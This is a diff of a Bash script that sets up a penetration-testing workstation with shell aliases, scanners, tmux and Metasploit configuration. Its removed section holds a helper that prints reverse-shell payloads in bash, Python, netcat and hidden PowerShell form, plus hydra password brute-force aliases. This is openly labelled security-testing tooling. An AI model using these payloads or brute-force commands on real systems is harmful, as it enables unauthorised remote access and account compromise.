-        echo "Usage: target <name> [IP]"
-        return 1
-    fi
-    ~/pentesting/scripts/init_target.sh "$1" "$2"
-}
-revshell() {
-    if [[ -z "$1" ]] || [[ -z "$2" ]]; then
-        echo "Usage: revshell <LHOST> <LPORT>"
-        echo "Generates common reverse shell payloads"
-        return 1
-    fi
-    local lhost="$1"
-    local lport="$2"
-    echo "=== REVERSE SHELL PAYLOADS ==="
-    echo ""
-    echo "Bash:"
-    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
-    echo ""
-    echo "Python:"
-    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
-    echo ""
-    echo "NC (traditional):"
-    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
-    echo ""
-    echo "PowerShell:"
-    echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
-}
-qscan() { if [[ -z "$1" ]]; then echo "Usage: qscan <target>"; return 1; fi; nmap -sS -sV -O -T4 --top-ports 1000 "$1"; }
-fscan() { if [[ -z "$1" ]]; then echo "Usage: fscan <target>"; return 1; fi; nmap -sS -sC -sV -O -T4 -p- "$1"; }
-wscan() { if [[ -z "$1" ]]; then echo "Usage: wscan <target>"; return 1; fi; nmap -sS -sV -p80,443,8080,8443,8000,3000,5000 --script=http-* "$1"; }
-
-alias cat='bat --paging=never'
-alias ls='exa --icons'
-alias ll='exa -lah --icons --group-directories-first'
-alias la='exa -la --icons'
-alias lt='exa --tree --level=2 --icons'
-alias grep='rg'
-alias find='fd'
-alias du='dust'
-alias ps='procs'
-alias top='btop'
-alias myip='curl -s ifconfig.me && echo'
-alias localip='ip addr show | grep "inet " | grep -v 127.0.0.1 | awk "{print \$2}" | cut -d/ -f1'
-alias ports='ss -tuln'
-alias connections='ss -tuln'
-alias listening='ss -tuln | grep LISTEN'
-alias webserver='python3 -m http.server'
-alias smbserver='impacket-smbserver share . -smb2support'
-alias ftpserver='python3 -m pyftpdlib -p 21'
-alias ..='cd ..'
-alias ...='cd ../..'
-alias ....='cd ../../..'
-alias pendir='cd ~/pentesting'
-alias tools='cd ~/pentesting/tools'
-alias targets='cd ~/pentesting/targets'
-alias gs='git status'
-alias ga='git add'
-alias gc='git commit -m'
-alias gp='git push'
-alias gl='git pull'
-alias tl='tmux list-sessions'
-alias ta='tmux attach-session -t'
-alias tn='tmux new-session -s'
-alias dps='docker ps'
-alias dpa='docker ps -a'
-alias di='docker images'
-alias dr='docker run --rm -it'
-alias msfconsole='msfconsole -q'
-alias msfdb='sudo msfdb'
-alias sploits='searchsploit'
-alias gobuster-common='gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u'
-alias gobuster-medium='gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u'
-alias ffuf-common='ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u'
-alias hydra-ssh='hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://'
-alias hydra-http='hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt http-get://'
-alias psmem='ps aux --sort=-%mem | head -10'
-alias pscpu='ps aux --sort=-%cpu | head -10'
-alias diskspace='du -h --max-depth=1 | sort -hr'
-alias largest='find . -type f -exec ls -sh {} + | sort -rh | head -10'
-alias netwatch='watch -n 1 "ss -tuln"'
-alias bandwidth='iftop -i eth0'
-alias taillog='tail -f /var/log/syslog'
-alias errors='journalctl -p 3 -xb'
-EOF
-    # Add source to .zshrc if not already there
-    if ! grep -q "pentesting_advanced.zsh" ~/.zshrc 2>/dev/null; then
-        echo "" >> ~/.zshrc
-        echo "# Load advanced pentesting configuration" >> ~/.zshrc
-        echo "[[ -f ~/.config/zsh/pentesting_advanced.zsh ]] && source ~/.config/zsh/pentesting_advanced.zsh" >> ~/.zshrc
-    fi
-    print_success "Advanced aliases and functions configured"
 }
 
 # === TMUX CONFIG ===
@@ -1311,6 +768,25 @@ EOF
     print_success "Tmux configuration created"
 }
 
+# Show help function
+show_help() {
+    cat << EOF
+Usage: $0 [OPTIONS]
+
+Options:
+  --skip-tools       Skip installing tools
+  --skip-zsh         Skip Zsh configuration
+  --skip-docker      Skip Docker installation
+  --skip-advanced    Skip advanced tools
+  --help             Show this help message
+
+Examples:
+  $0                  # Interactive installation
+  $0 --skip-docker    # Install everything except Docker
+  $0 --help           # Show help
+EOF
+}
+
 # Argument parsing for flexible execution
 SKIP_TOOLS=false
 SKIP_ZSH=false
@@ -1324,7 +800,7 @@ while [[ "$#" -gt 0 ]]; do
         --skip-docker) SKIP_DOCKER=true ;;
         --skip-advanced) SKIP_ADVANCED=true ;;
         --help)
-            echo "Usage: $0 [--skip-tools] [--skip-zsh] [--skip-docker] [--skip-advanced]"
+            show_help
             exit 0
             ;;
         *)
@@ -1335,60 +811,33 @@ while [[ "$#" -gt 0 ]]; do
     shift
 done
 
+# Initialize environment
+initialize_environment() {
+    print_status "Initializing environment..."
+    # Create necessary directories
+    mkdir -p ~/.config/zsh
+    mkdir -p ~/venvs/{pentesting,webapp}
+    print_success "Environment initialized"
+}
+
+# Check configuration
+check_config() {
+    print_status "Checking configuration..."
+    # Basic configuration checks
+    if [[ ! -d "$HOME" ]]; then
+        print_error "Home directory doesn't exist"
+        return 1
+    fi
+    print_success "Configuration check passed"
+    return 0
+}
+
 # Enhanced main function with better initialization
 main() {
-    local -A opts
-    local skip_all=false
-    local OPTIND
+    # Initialize logging
+    exec > >(tee -a "$LOG_FILE") 2>&1
     
-    # Initialize script environment
-    set -o errexit
-    set -o nounset
-    set -o pipefail
-    
-    # Process command line arguments using getopts
-    while getopts ":h-:" opt; do
-        case $opt in
-            -)
-                case "${OPTARG}" in
-                    skip-all)
-                        skip_all=true
-                        ;;
-                    skip-*)
-                        local key="${OPTARG#skip-}"
-                        opts[$key]=true
-                        ;;
-                    help)
-                        show_help
-                        return 0
-                        ;;
-                    *)
-                        print_error "Unknown option --${OPTARG}"
-                        show_help
-                        return 1
-                        ;;
-                esac
-                ;;
-            h)
-                show_help
-                return 0
-                ;;
-            *)
-                print_error "Invalid option: -$OPTARG"
-                show_help
-                return 1
-                ;;
-        esac
-    done
-    shift $((OPTIND-1))
-
-    # Initialize logging with rotation
-    if [[ -f "$LOG_FILE" ]]; then
-        mv "$LOG_FILE" "$LOG_FILE.old"
-    fi
-    : > "$LOG_FILE"
-    
-    print_status "Starting setup (Version: $VERSION)"
+    print_status "Starting setup (Version: $SCRIPT_VERSION)"
     print_status "Logging to $LOG_FILE"
 
     # Script header
@@ -1420,23 +869,56 @@ EOF
     # Create all required directories
     create_directories
     
-    # Continue with the rest of the installation...
-    # ...existing code...
-}
-
-# Ensure the script is being run, not sourced
-if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
-    trap 'err_handler $? $LINENO "$BASH_COMMAND"' ERR
-    trap 'cleanup_handler' EXIT
-    trap 'interrupt_handler' INT TERM
-    main "$@"
-fi
-    echo "5. Shared folders (if configured) are accessible via 'shared' alias"
+    # Update system
+    update_system
+    
+    # Install essential packages
+    if [[ "$SKIP_TOOLS" == "false" ]]; then
+        install_essential_packages
+    fi
+    
+    # Setup Zsh environment
+    if [[ "$SKIP_ZSH" == "false" ]]; then
+        setup_zsh_environment
+        setup_unified_aliases
+        setup_auto_venv
+    fi
+    
+    # Install container tools
+    if [[ "$SKIP_DOCKER" == "false" ]]; then
+        install_container_tools
+    fi
+    
+    # Install advanced tools
+    if [[ "$SKIP_ADVANCED" == "false" ]]; then
+        install_advanced_pentest_tools
+        create_advanced_scripts
+        setup_tmux_config
+    fi
+    
+    # Create useful scripts
+    create_useful_scripts
+    
+    # Configure additional components
+    configure_proxychains
+    setup_wordlists
+    configure_metasploit
+    configure_vmware_tools
+    
+    # Final messages
     echo ""
-    print_status "IMPORTANT: To apply all changes, please restart your terminal or run:"
-    echo "    source ~/.zshrc"
+    echo "==============================================="
+    print_success "Setup completed successfully!"
     echo ""
-    print_status "Quick start commands:"
+    echo "Next steps:"
+    echo "1. Restart your terminal or run: source ~/.zshrc"
+    echo "2. Check the log file for details: $LOG_FILE"
+    echo "3. Explore your new pentesting environment:"
+    echo "   - cd ~/pentesting"
+    echo "   - pentest (to activate Python environment)"
+    echo "   - tools (to access installed tools)"
+    echo ""
+    echo "Available commands:"
     echo "  - pentest       # Activate pentesting Python environment"
     echo "  - webapp        # Activate web app Python environment"
     echo "  - pendir        # Go to pentesting directory"
@@ -1444,29 +926,11 @@ fi
     echo "  - shared        # Go to VMware shared folders"
     echo "  - newscreen     # Create new screen session"
     echo "  - term          # Launch Terminator"
-    echo "  - termconfig    # Open Terminator preferences"
-    echo "  - update-tools  # Update all git tools"
     echo ""
     print_success "Happy hacking! 🎯"
 }
 
 # Ensure the script is being run, not sourced
 if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
-    trap 'err_handler $? $LINENO "$BASH_COMMAND"' ERR
-    trap 'cleanup_handler' EXIT
-    trap 'interrupt_handler' INT TERM
-    main "$@"
-fi
-    echo ""
-    print_success "Happy hacking! 🎯"
-}
-
-# Ensure the script is being run, not sourced
-if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
-    trap 'err_handler $? $LINENO "$BASH_COMMAND"' ERR
-    trap 'cleanup_handler' EXIT
-    trap 'interrupt_handler' INT TERM
-    main "$@"
-fi
     main "$@"
 fi
